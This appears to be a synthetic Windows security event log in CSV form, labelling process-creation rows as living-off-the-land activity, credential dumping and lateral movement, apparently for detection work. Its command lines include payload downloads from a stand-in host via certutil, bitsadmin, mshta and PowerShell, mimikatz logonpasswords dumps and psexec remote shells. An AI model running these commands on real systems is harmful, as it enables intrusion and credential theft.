_time,host,EventCode,user,src_ip,process,command_line,status,description
2025-09-10T12:41:10,WIN-APP01,4688,alice,10.0.0.44,certutil.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:41:15,WIN-WS01,4688,alice,10.0.0.5,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:41:20,WIN-APP01,4688,alice,10.0.0.8,wmic.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:41:25,WIN-APP01,4688,alice,10.0.0.12,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:41:30,WIN-APP01,4688,alice,10.0.0.8,powershell.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:41:35,WIN-DB01,4688,alice,10.0.0.44,wmic.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:41:40,WIN-APP01,4688,alice,10.0.0.12,mshta.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:41:45,WIN-WS02,4688,alice,10.0.0.12,bitsadmin.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:41:50,WIN-WS02,4688,alice,10.0.0.12,wmic.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:41:55,WIN-DB01,4688,alice,10.0.0.5,bitsadmin.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:42:00,WIN-WS01,4688,alice,10.0.0.12,bitsadmin.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:42:05,WIN-DB01,4688,alice,10.0.0.8,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:42:10,WIN-WS02,4688,alice,10.0.0.44,rundll32.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:42:15,WIN-DB01,4688,alice,10.0.0.5,powershell.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:42:20,WIN-WS02,4688,alice,10.0.0.12,rundll32.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:42:25,WIN-DB01,4688,alice,10.0.0.8,certutil.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:42:30,WIN-APP01,4688,alice,10.0.0.8,bitsadmin.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:42:35,WIN-APP01,4688,alice,10.0.0.44,mshta.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:42:40,WIN-DC01,4688,alice,10.0.0.8,certutil.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:42:45,WIN-DB01,4688,alice,10.0.0.5,mshta.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:42:50,WIN-WS01,4688,alice,10.0.0.8,powershell.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:42:55,WIN-WS01,4688,alice,10.0.0.12,wmic.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:43:00,WIN-APP01,4688,alice,10.0.0.44,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:43:05,WIN-WS02,4688,alice,10.0.0.44,bitsadmin.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:43:10,WIN-WS01,4688,alice,10.0.0.5,powershell.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:43:15,WIN-DB01,4688,alice,10.0.0.5,certutil.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:43:20,WIN-DC01,4688,alice,10.0.0.5,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:43:25,WIN-APP01,4688,alice,10.0.0.8,mshta.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:43:30,WIN-DC01,4688,alice,10.0.0.5,bitsadmin.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:43:35,WIN-WS01,4688,alice,10.0.0.8,cmd.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:43:40,WIN-APP01,4688,alice,10.0.0.5,bitsadmin.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:43:45,WIN-DC01,4688,alice,10.0.0.12,certutil.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:43:50,WIN-APP01,4688,alice,10.0.0.12,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:43:55,WIN-DB01,4688,alice,10.0.0.8,powershell.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:44:00,WIN-WS01,4688,alice,10.0.0.5,cmd.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:44:05,WIN-APP01,4688,alice,10.0.0.8,rundll32.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:44:10,WIN-DB01,4688,alice,10.0.0.5,mshta.exe,certutil -urlcache -split -f http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:44:15,WIN-DC01,4688,alice,10.0.0.44,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:44:20,WIN-DC01,4688,alice,10.0.0.44,cmd.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:44:25,WIN-WS02,4688,alice,10.0.0.44,cmd.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:44:30,WIN-APP01,4688,alice,10.0.0.5,cmd.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:44:35,WIN-WS01,4688,alice,10.0.0.5,cmd.exe,powershell Invoke-WebRequest http://malicious.site/payload.exe,OK,living_off_the_land_activity
2025-09-10T12:44:40,WIN-DC01,4688,alice,10.0.0.8,mshta.exe,wmic process call create cmd.exe,OK,living_off_the_land_activity
2025-09-10T12:44:45,WIN-DB01,4688,alice,10.0.0.5,wmic.exe,bitsadmin /transfer job http://malicious.site/file.exe,OK,living_off_the_land_activity
2025-09-10T12:44:50,WIN-WS01,4688,alice,10.0.0.8,rundll32.exe,rundll32.exe javascript:evil(),OK,living_off_the_land_activity
2025-09-10T12:44:55,WIN-DC01,4688,alice,10.0.0.12,mshta.exe,mshta http://malicious.site/payload.hta,OK,living_off_the_land_activity
2025-09-10T12:45:00,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:05,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:10,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:15,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:20,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:25,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:30,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:35,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:40,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:45,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:50,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:45:55,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:00,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:05,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:10,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:15,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:20,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:25,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:30,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:35,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:40,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:45,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:50,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:46:55,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:00,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:05,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:10,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:15,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:20,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:25,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:30,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:35,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:40,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:45,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:50,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:47:55,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:00,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:05,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:10,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:15,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:20,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:25,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:30,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:35,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:40,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:45,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:50,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:48:55,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:00,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:05,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:10,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:15,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:20,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:25,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:30,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:35,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:40,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:45,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:50,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:49:55,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:00,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:05,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:10,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:15,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:20,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:25,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:30,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:35,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:40,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:45,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:50,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:50:55,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:00,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:05,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:10,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:15,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:20,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:25,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:30,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:35,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:40,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:45,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:50,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:51:55,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:00,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:05,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:10,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:15,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:20,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:25,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:30,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:35,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:40,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:45,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:50,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:52:55,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:53:00,WIN-APP01,4688,administrator,45.77.22.91,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:53:05,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:53:10,WIN-APP01,4688,administrator,185.193.88.10,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:53:15,WIN-APP01,4688,administrator,91.240.118.33,mimikatz.exe,mimikatz sekurlsa::logonpasswords,OK,credential_dumping
2025-09-10T12:53:20,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:53:25,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:53:30,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:53:35,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:53:40,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:53:45,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:53:50,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:53:55,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:00,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:05,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:10,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:15,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:20,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:25,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:30,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:35,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:40,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:45,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:50,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:54:55,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:00,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:05,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:10,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:15,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:20,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:25,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:30,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:35,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:40,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:45,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:50,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:55:55,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:00,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:05,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:10,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:15,WIN-WS02,4688,administrator,45.77.22.91,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:20,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:25,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:30,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:35,WIN-WS02,4688,administrator,91.240.118.33,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
2025-09-10T12:56:40,WIN-WS02,4688,administrator,185.193.88.10,psexec.exe,psexec \\WIN-DB01 cmd.exe,OK,lateral_movement
